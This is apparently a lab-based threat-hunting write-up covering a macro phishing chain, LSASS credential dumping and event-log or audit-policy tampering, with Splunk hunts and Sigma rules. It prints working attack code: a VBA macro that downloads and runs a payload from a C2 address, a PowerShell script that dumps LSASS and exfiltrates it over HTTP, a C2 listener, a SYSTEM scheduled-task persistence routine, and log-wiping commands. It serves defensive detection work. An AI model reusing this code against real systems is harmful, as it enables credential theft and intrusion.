<img width="1098" height="314" alt="Screenshot_68" src="https://github.com/user-attachments/assets/cb3cb595-29db-4a7c-ba20-057ae242826e" />


#### Attack Reconstruction

By correlating all observed events, we can reconstruct the full attack:
- The malware (WindowsUpdate.exe) was introduced into the system
- The user executed the file manually
- The malware established persistence via Registry Run key
- It initiated outbound communication to the attacker’s C2 server
- It began periodic beaconing to exfiltrate data

> This structured view transforms raw logs into a clear attack narrative.

**Indicators of Compromise (IOCs)**
- WindowsUpdate.exe
- 192.168.200.129:8080
- DESKTOP-MOPLS2N\GLITCH

Why IOCs matter:
Can be used for detection rules
Help identify similar infections across the environment
Serve as a foundation for alerting and threat hunting

---

## Use Case 2: Phishing via Malicious Word Attachment

## Scenario Overview
In this scenario, we simulate a phishing attack where the attacker delivers a malicious Microsoft Word document (`Invoice.docx`) via email. When the victim opens the file and enables macros, embedded VBA code triggers a PowerShell command that downloads a secondary payload from a Command and Control (C2) server. The malware then executes, collects basic host information, and exfiltrates it back to the attacker.


### Attack Flow

1. **Initial Access (Phishing):**
    
    The victim receives a phishing email containing a malicious Word attachment (`.doc`) disguised as an invoice or official document.
    
2. **Execution (User Interaction):**
    
    The user opens the document and clicks **"Enable Content"**, allowing the embedded macro to run.
    
3. **Execution (Macro → PowerShell):**
    
    The VBA macro spawns a hidden PowerShell process 
    
4. **Payload Delivery:**
    
    PowerShell downloads the malware (script or binary) from the attacker’s C2 server.
    
5. **Persistence:**
    
    The downloaded payload establish persistence via:
    - Scheduled Task
    
6. **Discovery:**
    
    The malware collects:
    
    - Computer Name
    - Username
    - OS Version
  
7. **C2 Communication:**
    
    The malware establishes communication with the C2 server over HTTP/HTTPS.
    
8. **Exfiltration:**
    
    Collected data is sent back to the attacker via HTTP POST requests.

---

### MITRE ATT&CK Mapping

| Stage | Action | MITRE ATT&CK ID | Artifacts / Logs |
| --- | --- | --- | --- |
| **Initial Access** | Phishing email with malicious attachment | **Phishing: Attachment (T1566.001)** | Email Gateway Logs / Outlook Logs |
| **Execution** | User enables macros in Word | **User Execution (T1204.002)** | Office Alerts / User Activity |
| **Execution** | VBA macro runs PowerShell | **Command and Scripting Interpreter: PowerShell (T1059.001)** | Sysmon Event ID 1 |
| **Defense Evasion** | PowerShell runs with hidden window & bypass policy | **Obfuscated/Compressed Files (T1027)** | PowerShell Logs / EDR |
| **Payload Delivery** | Downloads payload from C2 | **Ingress Tool Transfer (T1105)** | Sysmon Event ID 3 |
| **Persistence** | Registry Run Key / Scheduled Task | **Boot or Logon Autostart (T1547.001)** | Sysmon Event ID 13 |
| **Discovery** | Collects system information | **System Information Discovery (T1082)** | EDR Telemetry |
| **C2 Channel** | HTTP/HTTPS communication | **Application Layer Protocol (T1071.001)** | Network Logs / Proxy |
| **Exfiltration** | Data sent via HTTP POST | **Exfiltration Over C2 Channel (T1041)** | PCAP / Network Monitoring |

---

## Environment & Malware Setup


In this section, we’ll walk through how the attack was actually built from the red team side.

Nothing fancy… just a simple phishing chain:

Word → Macro → PowerShell → Malware → C2

---

### Malicious Word Document & Macros

So the initial access here was a **malicious Word document** with embedded macros.

Once the victim opens the document and enables macros… everything starts.

---

#### Macro Code

```
SubDocument_Open()
Macro1
EndSub

SubAutoOpen()
Macro1
EndSub

SubMacro1()

DimsavePathAsString
savePath =Environ("TEMP")&"\\WindowsUpdate.exe"

DimstrAsString
str ="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.61.128/WindowsUpdate.exe','"&savePath&"')"""

Shellstr,vbHide

Wait (5)

IfDir(savePath)<>""Then
ShellsavePath,vbHide
EndIf

EndSub

SubWait(nAsLong)
DimtAsDate
t =Now
Do
DoEvents
LoopUntilNow>=DateAdd("s",n,t)
EndSub
```

---

#### What’s going on here?

### 1. **Auto Execution (Trigger)**

```
SubDocument_Open()
SubAutoOpen()
```

These two make sure the macro runs automatically:

- When the document is opened
- Without user interaction (after enabling macros)

So the moment the victim clicks **“Enable Content”**… it’s game over.

---

### 2. **Drop Location (Stealthy Path)**

```
savePath =Environ("TEMP")&"\\WindowsUpdate.exe"
```

- Uses `%TEMP%` directory → less suspicious
- File name → `WindowsUpdate.exe` (looks legit)

Classic trick to avoid raising attention.

---

### 3. **PowerShell Payload Execution**

```
powershell-WindowStyleHidden-ExecutionPolicyBypass
```

Let’s break this down:

- `WindowStyle Hidden` → no visible window
- `ExecutionPolicy Bypass` → ignore security restrictions
- `System.Net.WebClient` → used to download the payload

So basically:

> “Go to attacker server and grab the malware silently”
> 

---

### 4. **Download Stage (Payload Delivery)**

```
DownloadFile('http://192.168.61.128/WindowsUpdate.exe', savePath)
```

- Connects to attacker C2
- Downloads the payload
- Saves it locally

---

### 5. **Execution Stage**

```
Wait (5)

IfDir(savePath)<>""Then
ShellsavePath,vbHide
EndIf
```

- Waits 5 seconds (just to make sure download finished)
- Checks if file exists
- Executes it silently

---

### Macro TL;DR

- User opens Word file
- Enables macros
- Macro downloads malware
- Executes it

All silently… no UI… no warning… just vibes 😅

<img width="1365" height="736" alt="Screenshot_11" src="https://github.com/user-attachments/assets/63f42723-7c82-4749-b9d7-b6f8caa583a3" />

---

# Malware (C++ Payload)

This is the actual payload that gets dropped and executed.

I reused the same malware from the previous scenario, but modified the **persistence technique** a bit.

---

### 2. **Persistence (Scheduled Task)**

```cpp
void EstablishTaskPersistence() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    string taskName = "WindowsUpdateTask";  

   
    string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + 
                     string(exePath) + "\" /sc ONLOGON /ru SYSTEM /f /rl HIGHEST";

   
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  ("/c " + command).c_str(), 
                  NULL, SW_HIDE);
}
```

### Malware TL;DR

- Establish persistence
- Collect system info
- Send data to C2
- Repeat every 30 sec

---

# C2 Server Setup

For this scenario, I reused the same C2 server from the previous use case.

No need to reinvent the wheel 👀

## C2 Behavior

This Python script acts as a **simple HTTP listener**:

- Listens on port `8080`
- Receives POST requests from infected machines
- Logs everything into a local file

### C2 TL;DR

- Acts as attacker server
- Receives data from victim
- Logs everything

---

## Hunting

It was just another boring Tuesday… nothing special, until suddenly an alert popped up saying that the machine **DESKTOP-MOPLS2N** might be compromised, and you’re required to investigate, build a timeline, and deliver a report.

The only piece of info you had was an MD5 hash:

**MD5:** `3FD59CE4A49E118D86180828E041AC5B`

---

So I started by searching for the hash in Splunk:

```
index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" MD5=3FD59CE4A49E118D86180828E041AC5B
```

But… nothing showed up. No logs, no hits.

So clearly, I needed another way to pivot.

<img width="1365" height="622" alt="Screenshot_1" src="https://github.com/user-attachments/assets/c4924295-8568-43e9-ba1a-c61f6aa05604" />

---

At this stage, I suspected this might be a **phishing attack**, so I decided to check the hash on threat intel sources like VirusTotal.

And yeah… the file was flagged as **malicious**.

Also got some extra info:

- File name: `Invoice1.doc`
- File type: Word document

So now the story is getting clearer.

<img width="1365" height="624" alt="Screenshot_2" src="https://github.com/user-attachments/assets/c95a801a-b869-4d9a-afdc-27ff43d33d3b" />

---

I went back to Splunk and searched using the file name:

```
index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" Invoice1.doc
```

While digging through the logs, I noticed something interesting.

There was a **Word document (Invoice.doc)** executed by **WINWORD.EXE**.

At first glance, everything looked legit… just a normal user opening a document, But then things started to get a bit weird.

<img width="1365" height="618" alt="Screenshot_3" src="https://github.com/user-attachments/assets/eea1f1ad-493b-4b8d-8cd3-3ace85c18770" />
<img width="1141" height="595" alt="Screenshot_4" src="https://github.com/user-attachments/assets/84c04c57-36e4-4858-96f3-ba2dd2280542" />

---

I found that **Invoice1.doc** spawned a **PowerShell child process** with the following command:

```
powershell-WindowStyleHidden-ExecutionPolicyBypass-Command"(New-Object System.Net.WebClient).DownloadFile('http://192.168.61.128/WindowsUpdate.exe','C:\Users\GLITCH\AppData\Local\Temp\WindowsUpdate.exe')"
```

Even if you’re not deep into PowerShell, this is pretty straightforward:

- It connects to a remote server (C2) → `192.168.61.128`
- Downloads a file → `WindowsUpdate.exe`
- Saves it in → Temp directory

At this point… yeah, things are definitely not okay 😂

<img width="1151" height="593" alt="Screenshot_5" src="https://github.com/user-attachments/assets/d264e898-ddbb-43ae-82ca-5ade0365a232" />

---

### Detection (Sigma Role) :

We can detect this behavior using the following Sigma rule:

```
title: Suspicious PowerShell DownloadFile Usage
id: ps-downloadfile
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    Image|endswith:'powershell.exe'
    CommandLine|contains:
      -'DownloadFile'
      -'System.Net.WebClient'
  condition: selection

level: high
```

Between the events, there was an important log showing that the user actually **enabled macros**. 

That’s a very big deal in our story

<img width="1156" height="433" alt="Screenshot_6" src="https://github.com/user-attachments/assets/dfc02616-41ca-4907-a2a7-9f2fa8058ca7" />

---

### What’s happening so far?

- User downloads Word file
- Opens it
- Enables macros
- Macro runs malicious PowerShell
- PowerShell downloads malware
- Malware gets executed

Classic.

---

### Detection Opportunity:

We can detect Word spawning PowerShell using:

```
title: Word Spawning PowerShell
id: word-spawn-ps
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    ParentImage|endswith:'WINWORD.EXE'
    Image|endswith:'powershell.exe'
  condition: selection

level: high
```

---

Now let’s move to the malware itself → **WindowsUpdate.exe**

I used:

```
index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*" WindowsUpdate.exe
```

<img width="1365" height="624" alt="Screenshot_8" src="https://github.com/user-attachments/assets/f386c627-5f5c-4225-a650-50355b5a7508" />

---

### Timeline

- PowerShell execution → `10:24:19`
- File created → `10:24:22`
- Malware executed → `10:24:24`

Everything happened within seconds… super fast chain.

<img width="1159" height="629" alt="Screenshot_7" src="https://github.com/user-attachments/assets/7ef8f62b-2563-42f7-a82f-4202958e846f" />

---

Then I noticed a **network connection (EventCode=3)**:

- Victim → `DESKTOP-MOPLS2N`
- Attacker → `192.168.61.128`
- Port → `8080`

Most likely this is **C2 communication / data exfiltration**

(We don’t have full telemetry, but yeah… looks sus enough)

<img width="1097" height="622" alt="Screenshot_9" src="https://github.com/user-attachments/assets/cad23022-e023-4407-a9a4-f7113ce82392" />

---

### Detection Opportunity:

Detect suspicious outbound connections:

```
title: Suspicious Outbound Connection to C2
id: c2-connection
logsource:
  product: windows
  category: network_connection

detection:
  selection:
    DestinationPort: 8080
  condition: selection

level: medium
```

---

While digging deeper, I found something more interesting…

A **Scheduled Task** was created:

```
"C:\Windows\System32\cmd.exe"/cschtasks/create/tn"WindowsUpdateTask"/tr"C:\Users\GLITCH\AppData\Local\Temp\WindowsUpdate.exe"/scONLOGON/ruSYSTEM/f/rlHIGHEST
```

<img width="1161" height="594" alt="Screenshot_10" src="https://github.com/user-attachments/assets/721a549e-c982-4f7b-ac15-87940682d94e" />

---

This basically means:

- Create a task named `WindowsUpdateTask`
- Execute the malware on every logon
- Run it as SYSTEM (highest privileges)

That’s **Persistence**

---

###  Detection Opportunity:

Detect suspicious scheduled task creation:

```
title: Suspicious Scheduled Task Creation
id: schtask-persistence
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    Image|endswith:'schtasks.exe'
    CommandLine|contains:
      -'/create'
      -'ONLOGON'
  condition: selection

level: medium
```

---

After that, logs showed repeated connections every ~30 seconds.

Yeah… classic **beaconing pattern** (and honestly, kinda noisy 😅)

---

## Summary

### What Happened (Timeline)

1. User downloaded a malicious Word file (`Invoice1.doc`)
2. Opened it and enabled macros
3. Macro executed PowerShell
4. PowerShell downloaded `WindowsUpdate.exe` from attacker C2
5. Malware executed on the system
6. Established connection to attacker (C2)
7. Created Scheduled Task for persistence
8. Started beaconing every ~30 seconds

---

### MITRE ATT&CK Mapping

- Phishing → `T1566`
- User Execution (Macro) → `T1204.002`
- PowerShell Execution → `T1059.001`
- Ingress Tool Transfer → `T1105`
- Persistence (Scheduled Task) → `T1547.001`
- C2 Communication → `T1071`

---

### (SIEM / Detection Engineering)

The Sigma rules above can be converted into SIEM queries.

#### Example (Splunk):

```
index=* EventCode=1 Image="*powershell.exe*" CommandLine="*DownloadFile*"
```

---

# Use Case 3: Hunting for LSASS Memory Access (Credential Dumping)

## Hypothesis

> *"Based on documented threat actor behavior, we'll hunt for unauthorized access to the LSASS process — a common technique used to extract credentials from memory on Windows endpoints. We'll emulate the behavior and validate our detection coverage using Sysmon and Windows Security logs."*
> 

**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

---

## Attack Flow


1. **Execution**
PowerShell script executes (bypassing execution policy).
2. **Credential Access (T1003.001)**
Uses rundll32.exe + comsvcs.dll to perform **LSASS Memory Dump**.
3. **Collection**
Saves the LSASS dump file in %TEMP% folder.
4. **Exfiltration (T1041)**
Sends the dump file to the C2 server via HTTP POST.
5. **Defense Evasion**
Runs commands silently + deletes the dump file after exfiltration.

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Description |
| --- | --- | --- | --- |
| Execution | T1059.001 | PowerShell | Execute malicious PowerShell script |
| Credential Access | **T1003.001** | OS Credential Dumping: LSASS Memory | Dump LSASS process using comsvcs.dll |
| Collection | T1005 | Data from Local System | Collect credentials from memory |
| Exfiltration | **T1041** | Exfiltration Over C2 Channel | Send dump file over HTTP to C2 |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Use rundll32 to hide activity |
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Delete dump and script after use |

---

## Environment & Malware Setup

### 1. PowerShell Dropper (LSASS Dump + Exfiltration)

### What this script is doing

The script is pretty straightforward. It does three main things:

- Dumps the LSASS process to extract credentials
- Sends the dump to a remote C2 server
- Deletes any traces after execution

---

### Step 1: Initial setup

```powershell
$DumpPath = "$env:TEMP\lsass_$(Get-Random).dmp"
$C2_URL   = "http://192.168.61.128:8080/exfil"
```

- The dump file is saved in the `%TEMP%` directory
- A random name is used to avoid obvious patterns
- The C2 server endpoint is hardcoded

This helps make the activity slightly less noticeable.

---

### Step 2: Dumping LSASS

```powershell
$Proc = Get-Process -Name lsass -ErrorAction Stop
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $Proc.Id $DumpPath full | Out-Null
```

- The script locates the LSASS process
- Uses `comsvcs.dll` with `rundll32.exe` to generate a memory dump

Important detail:

- This is a built-in Windows component (LOLBIN), so no external tools are needed
- It’s a common technique to avoid detection compared to tools like Mimikatz

---

### Step 3: Verifying the dump

```powershell
if (Test-Path $DumpPath)
```

- The script checks if the dump file was created successfully
- If not, it exits quietly without errors

---

### Step 4: Exfiltration

```powershell
$bytes = [System.IO.File]::ReadAllBytes($DumpPath)

Invoke-WebRequest -Uri $C2_URL -Method POST `
                  -Body $bytes `
                  -ContentType "application/octet-stream"
```

- The dump file is read as raw bytes
- Sent directly to the C2 server using an HTTP POST request

Notes:

- No encoding or obfuscation is used
- The data is transferred as-is

---

### Step 5: Cleanup

```powershell
Remove-Item $DumpPath -Force
Remove-Item "$env:TEMP\Dropper.ps1" -Force
```

- Deletes the dump file after sending
- Deletes the script itself

This reduces forensic artifacts on the system.

---

### General behavior

- The script runs silently
- Uses try/catch blocks to avoid visible errors
- Produces no output

This is intentional to reduce visibility during execution.

---

## 2. C2 Server Setup

### Option 1: Basic HTTP server (testing only)

```bash
python3 -m http.server 8080
```

- Quick way to start a server
- Does not properly handle POST data

Only useful for basic connectivity testing.

---

### Option 2: Custom C2 listener

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
```

---

### Handling incoming data

```python
def do_POST(self):
    length = int(self.headers['Content-Length'])
    data = self.rfile.read(length)
```

- Reads the incoming POST request body
- Data is received in raw binary format

---

### Saving the dump

```python
with open(f"lsass_dump_{len(data)}.dmp", "wb") as f:
    f.write(data)
```

- Saves the received data as a dump file
- Uses file size in the filename for quick identification

---

### Running the server

```python
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

- Listens on all interfaces
- Uses the same port configured in the PowerShell script

---

## Linking to the scenario

This setup follows the same C2 concept used in previous scenarios:

- Same communication method (HTTP POST)
- Same port and structure
- Same attacker-controlled server

The main difference here is the data being exfiltrated:

- Instead of system info, this scenario sends credential dumps from LSASS

---

## Hunting

### LSASS Dumping (Quick Intro before we dive in)

Alright so let’s start from the basics…

**LSASS (Local Security Authority Subsystem Service)** is one of the most important processes in Windows.

It’s responsible for:

- Authentication
- Storing credentials in memory
- Handling NTLM / Kerberos

So basically…

if someone gets access to LSASS memory → **they can dump credentials (plaintext, hashes, tickets, everything)**

### Common LSASS Dumping Techniques

There are multiple ways attackers do this:

- Mimikatz (the classic)
- procdump
- Task Manager dump
- `comsvcs.dll + MiniDump`  (LOLBin)
- rundll32 abuse

Why are we using `comsvcs.dll + MiniDump` here?

- Built-in (no external tools needed)
- Looks legit
- Used a lot by attackers
- Kinda stealthier

### So Lets Break this

First thing we saw:

#### EventCode = 1 (Process Create)

```
powershell-epbypass-fileC:\Users\GLITCH\AppData\Local\Temp\Dropper.ps1
```

This command basically:

- Runs PowerShell
- Bypasses execution policy
- Executes a script → `Dropper.ps1`

Most likely running with high privileges

### Sigma Rule:

We can detect this behavior using the following Sigma rule:

```
title: Suspicious PowerShell Execution Policy Bypass
id: ps-bypass
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    Image|endswith:'powershell.exe'
    CommandLine|contains:'-ep bypass'
  condition: selection

level: medium
```

<img width="1036" height="147" alt="Screenshot_1" src="https://github.com/user-attachments/assets/98ba215c-8006-424b-b640-26c75c8e0a02" />

---

Right after that…

#### EventCode = 1 again

But this time:

- **Image:** `rundll32.exe`
- **Parent:** PowerShell

```
"C:\Windows\system32\rundll32.exe"C:\Windows\System32\comsvcs.dllMiniDump676C:\Users\GLITCH\AppData\Local\Temp\lsass_487131235.dmpfull 
```

<img width="930" height="557" alt="Screenshot_2" src="https://github.com/user-attachments/assets/1e870493-ecde-4741-ae51-9740d9dfc215" />

Let’s break this command down step by step:

#### `rundll32.exe`= A legit Windows binary, Used to execute functions inside DLL files

#### `comsvcs.dll` = Also a legit built-in DLL, Contains a function called `MiniDump`

#### `MiniDump` = This is the function responsible for dumping process memory

#### `676` = That’s the PID (very likely LSASS process)

#### `lsass_487131235.dmp` = Output file (where the dump will be saved)

#### `full` = Means full memory dump

So in simple terms:

> “Go dump LSASS memory and save it to a file”
> 

That’s straight up credential dumping.

#### Sigma Rule:

We can detect this behavior using the following Sigma rule:

```
title: LSASS Dump via comsvcs.dll
id: lsass-dump-comsvcs
logsource:
  product: windows
  category: process_creation

detection:
  selection:
    Image|endswith:'rundll32.exe'
    CommandLine|contains:
      -'comsvcs.dll'
      -'MiniDump'
  condition: selection

level: high
```

<img width="717" height="343" alt="Screenshot_3" src="https://github.com/user-attachments/assets/1fe114d3-a211-4ec2-ba0f-9245dee19af9" />

Next we saw ‘EventCode = 11’ Makes perfect sense… this is the dumped file

#### EventCode = 11 (File Create)

- Image → `rundll32.exe`
- File → `lsass_487131235.dmp`

#### Sigma Rule:

We can detect this behavior using the following Sigma rule:

```
title: LSASS Dump File Creation
id: lsass-dump-file
logsource:
  product: windows
  category: file_event

detection:
  selection:
    TargetFilename|contains:'.dmp'
  condition: selection

level: medium
```

<img width="936" height="555" alt="Screenshot_4" src="https://github.com/user-attachments/assets/94e1fa0e-89d6-4b81-8334-358b838fc0a5" />

#### Then we found “EventCode = 3” This is most likely:

- Dump being sent out
- Or communication with attacker

We can’t confirm 100% due to limited data sources But honestly… looks like **exfiltration** 

- Source → `192.168.61.129`
- Destination → `192.168.61.130`
- Port → `8080`

#### Sigma rule:

We can detect this behavior using the following Sigma rule:

```
title: Possible Data Exfiltration over 8080
id: exfil-8080
logsource:
  product: windows
  category: network_connection

detection:
  selection:
    DestinationPort: 8080
  condition: selection

level: medium
```

<img width="942" height="557" alt="Screenshot_5" src="https://github.com/user-attachments/assets/02af22c0-9954-42f7-be38-3e90a8ed67a9" />

---

### Summary

#### What Happened (Timeline)

1. PowerShell script executed (`Dropper.ps1`)
2. Script spawned `rundll32.exe`
3. rundll32 used `comsvcs.dll` to dump LSASS
4. Dump file created in Temp directory
5. Network connection initiated to another host
6. Possible exfiltration attempt

---

#### MITRE ATT&CK Mapping

- PowerShell Execution → `T1059.001`
- LSASS Dumping → `T1003.001`
- LOLBins Abuse → `T1218`
- Exfiltration → `T1041`

---

#### And The last Thing

Don’t just rely on one detection, Correlate everything 

### Attack Chain Detection:

- PowerShell (bypass)
→ rundll32
→ comsvcs MiniDump
→ dump file
→ outbound connection

### Example (Splunk):

```
index=*
(Image="*powershell.exe*" CommandLine="*-ep bypass*")
OR (Image="*rundll32.exe*" CommandLine="*MiniDump*")
OR (TargetFilename="*.dmp")
```

<img width="1356" height="543" alt="Screenshot_6" src="https://github.com/user-attachments/assets/c2d03dff-780a-47f4-bc48-37e940ae6a13" />

---

# Use Case 4: Hunting for Indicator Removal — Catching the Cover-Up

### Hypothesis

> *"Threat actors commonly attempt to clear Windows Event Logs after completing their objectives to hinder forensic analysis. We'll hunt for this behavior by identifying the artifacts that the clearing action itself leaves behind — artifacts the attacker cannot remove."*
> 

**MITRE:** T1070.001 — Indicator Removal: Clear Windows Event Logs

---

## Indicator Removal: Clear Windows Event Logs — T1070.001

So let's talk about one of my favorite techniques to hunt for, not because it's the most complex, but because of the irony behind it. The attacker tries to cover their tracks by wiping the logs... and that action itself leaves a log entry they can't delete. Beautiful, right?

---

## What's the Technique?

After an attacker finishes their objectives — whether it's dumping credentials, moving laterally, or dropping ransomware — they want to clean up. One of the most common cleanup steps is clearing Windows Event Logs to make the SOC analyst's life harder during incident response.

The goal is simple: **no logs = no evidence.**

But Windows had other plans.

---

## How Can It Happen? (Methods)

### Method 1: wevtutil

This is the most common way you'll see it in the wild. `wevtutil` is a built-in Windows tool for managing event logs — totally legitimate, which is exactly why attackers love it.

```bash
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

You'll also see it sometimes as a one-liner in scripts:

```bash
for /F "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl "%1"
```

That last one clears **every single log** on the machine in a loop. That's the aggressive version.

**Sigma Rule:**

```yaml
title: Event Log Cleared via wevtutil
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - ' cl '
            - ' clear-log '
    condition: selection
falsepositives:
    - Legitimate admin log maintenance
level: high
tags:
    - attack.defense_evasion
    - attack.t1070.001
```

> These are the logs that will appear when you clear a specific source log.
<img width="931" height="559" alt="Screenshot_2" src="https://github.com/user-attachments/assets/2a15cd78-3c82-4730-b865-db8ecb877aae" />

> Right after that, you'll find in the System log that an **EventCode=104** has been recorded, indicating that the Application source log was cleared.
<img width="552" height="551" alt="Screenshot_3" src="https://github.com/user-attachments/assets/7de9afff-7901-46f2-950e-51e47c45dc38" />

---

### Method 2: PowerShell (The Stealthier One)

Some attackers prefer to do it through PowerShell because it can be obfuscated more easily and doesn't always trigger the same signatures as wevtutil.

```powershell
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }
```

Or the more modern version:

```powershell
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Security")
```

**Sigma Rule:**

```yaml
title: Event Log Cleared via PowerShell
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Clear-EventLog'
            - 'ClearLog'
    condition: selection
falsepositives:
    - Admin scripts during maintenance windows
level: high
tags:
    - attack.defense_evasion
    - attack.t1070.001
```

> And the same with Powershell:  `Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }`
<img width="939" height="554" alt="Screenshot_4" src="https://github.com/user-attachments/assets/298f7a9a-1ffb-4f85-b631-03bc891717d0" />

---

### Method 3: The Smoking Gun — EID 1102 & 104

Here's the part I love. No matter which method the attacker uses, Windows generates two events that **survive the clearing:**

- **Security EID 1102** — "The audit log was cleared"
- **System EID 104** — "The event log was cleared"

These get written *after* the clear action completes, meaning they're born into an already-wiped log. The attacker would have to clear the logs a second time to remove them — and that would just generate them again. It's a trap they can't escape.

**Sigma Rule:**

```yaml
title: Windows Event Log Cleared — Smoking Gun
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID:
            - 1102
            - 104
    condition: selection
falsepositives:
    - Legitimate log rotation by IT admins
level: high
tags:
    - attack.defense_evasion
    - attack.t1070.001
```
<img width="1092" height="555" alt="Screenshot_5" src="https://github.com/user-attachments/assets/b7246f03-7c53-478a-9cab-935fa864e8ab" />

---

### Method 4: Via a Script or Malware (Automated Cleanup)

In real ransomware incidents, log clearing isn't manual — it's baked into the malware itself as a cleanup routine that runs automatically. You'll see it as a child process of something unexpected, like:

```
malware.exe → cmd.exe → wevtutil.exe cl Security
```

That parent-child relationship is a huge red flag.

**Sigma Rule:**

```yaml
title: Suspicious Parent Spawning wevtutil for Log Clearing
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - ' cl '
            - ' clear-log '
        ParentImage|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
    filter_legit:
        ParentImage|contains:
            - '\Windows\System32\'
    condition: selection and not filter_legit
falsepositives:
    - Admin batch scripts
level: critical
tags:
    - attack.defense_evasion
    - attack.t1070.001
```

---

### Method 5: **Audit Policy Tampering — T1562.002**

**Audit Policy Tampering.** This one is sneaky because the whole point is to make Windows *stop recording evidence* before the attacker does anything noisy.

## What Is It?

Windows has a built-in system called **Audit Policy** that controls what gets logged in the Security Event Log. Things like logons, process creation, file access — all of that is governed by this policy.

An attacker who knows what they're doing will tamper with this policy *before* doing anything malicious. That way, their actions generate no logs at all. It's not about cleaning up after yourself — it's about making sure there's nothing to clean up in the first place.


### Method 1: auditpol.exe (The Direct Approach)

`auditpol` is a legitimate built-in Windows tool for managing audit policies. Attackers abuse it to disable logging entirely:

```bash
auditpol /set /category:* /success:disable /failure:disable
```

Or targeting specific categories to be more surgical:

```bash
auditpol /set /subcategory:"Logon" /success:disable
auditpol /set /subcategory:"Process Creation" /success:disable
```

**Sigma Rule:**

```yaml
title: Audit Policy Disabled via auditpol
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\auditpol.exe'
        CommandLine|contains:
            - 'disable'
            - '/set'
    condition: selection
falsepositives:
    - Legitimate GPO-based audit policy changes
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.002
```

---

### Method 2: Group Policy / Registry Modification

More advanced attackers modify the audit policy through the registry directly, which can be quieter than running auditpol:

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "AuditBaseObjects" /t REG_DWORD /d 0 /f
```

This approach is less common but harder to detect if you're only watching for auditpol.exe execution.

**Sigma Rule:**

```yaml
title: Audit Policy Registry Tampering
status: experimental
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Control\Lsa'
            - '\CurrentControlSet\Services\EventLog'
        Details:
            - 'DWORD (0x00000000)'
    condition: selection
falsepositives:
    - Legitimate system hardening scripts
level: medium
tags:
    - attack.defense_evasion
    - attack.t1562.002
```

---

### Method 3: PowerShell (Wrapped Execution)

Sometimes it's done through PowerShell just to add an extra layer and potentially bypass script monitoring:

```powershell
& auditpol.exe /set /category:* /success:disable /failure:disable
```

Or using WMI to make it even less obvious:

```powershell
$result = Invoke-Expression "auditpol /set /category:* /success:disable"
```

**Sigma Rule:**

```yaml
title: Audit Policy Tampered via PowerShell
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\powershell.exe'
        Image|endswith: '\auditpol.exe'
    condition: selection_parent
falsepositives:
    - Admin automation scripts
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.002
```

---

## How Do You Catch It?

### The Direct Evidence — EID 4719

This is your best friend here. Every time the Audit Policy changes, Windows logs **Security EID 4719 — "System audit policy was changed."**

The beautiful irony? This event gets written *before* the auditing is disabled — so it betrays the attacker's action right as it happens.

```
index=wineventlog EventCode=4719
| table _time, Computer, User, Message
| sort -_time
```

### Sysmon EID 1 — Process Execution

Even if the Security log gets cleared afterward, Sysmon would have already captured the auditpol execution:

```
index=sysmon EventCode=1 Image="*auditpol.exe"
| where match(CommandLine, "(?i)(disable|/set)")
| table _time, Computer, User, CommandLine, ParentImage
```

### The Silence Indicator

If auditing gets disabled and somehow EID 4719 was missed, there's still a behavioral indicator — **the log goes unusually quiet.** A healthy Windows system generates Security events constantly. A sudden gap with no events is itself suspicious and worth investigating.

---

## The Full Attack Chain — When Combined with T1070.001

This is where it gets really interesting for your scenario. When you see these two techniques together, it tells a very clear story:

```
EID 4719 → Audit Policy disabled     (T1562.002)
         ↓
    [silence — no events generated]
         ↓
EID 1102 → Security log cleared      (T1070.001)
EID 104  → System log cleared
         ↓
    [attacker thinks they're clean]
         ↓
    EID 4719 + 1102 still exist      ← can't escape this
```

**Correlation Query:**

```
index=wineventlog (EventCode=4719 OR EventCode=1102 OR EventCode=104)
| append
    [search index=sysmon EventCode=1 Image="*auditpol.exe"]
| sort _time
| table _time, EventCode, Computer, User, CommandLine, Message
```

---

